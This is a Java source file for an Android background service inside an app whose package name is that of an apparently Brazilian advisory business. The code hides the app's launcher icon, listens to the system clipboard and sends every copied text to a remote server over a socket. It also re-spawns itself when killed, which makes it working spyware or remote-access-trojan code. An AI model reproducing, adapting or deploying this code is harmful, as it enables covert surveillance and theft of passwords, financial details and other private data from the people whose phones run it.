package br.com.assessoriarealeza.irp;

import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class MainService extends Service {

    private static Context contextOfApplication;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int flags, int startId) {

        // Esconder ícone do app
        PackageManager pkg = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pkg.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        // Listener para monitorar a área de transferência do sistema
        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);

        // Iniciar conexão com o servidor
        contextOfApplication = this;
        ConnectionManager.startAsync(this);

        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        // Reativar o ícone do app após a destruição do serviço
        PackageManager pkg = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pkg.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

        // Enviar broadcast para reiniciar o serviço
        sendBroadcast(new Intent("respawnService"));
    }

    private final ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener =
            new ClipboardManager.OnPrimaryClipChangedListener() {
                public void onPrimaryClipChanged() {
                    ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                    if (clipboard.hasPrimaryClip()) {
                        ClipData clipData = clipboard.getPrimaryClip();
                        if (clipData.getItemCount() > 0) {
                            CharSequence text = clipData.getItemAt(0).getText();
                            if (text != null) {
                                try {
                                    JSONObject data = new JSONObject();
                                    data.put("text", text);
                                    IOSocket.getInstance().getIoSocket().emit("0xCB", data);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    }
                }
            };

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

}
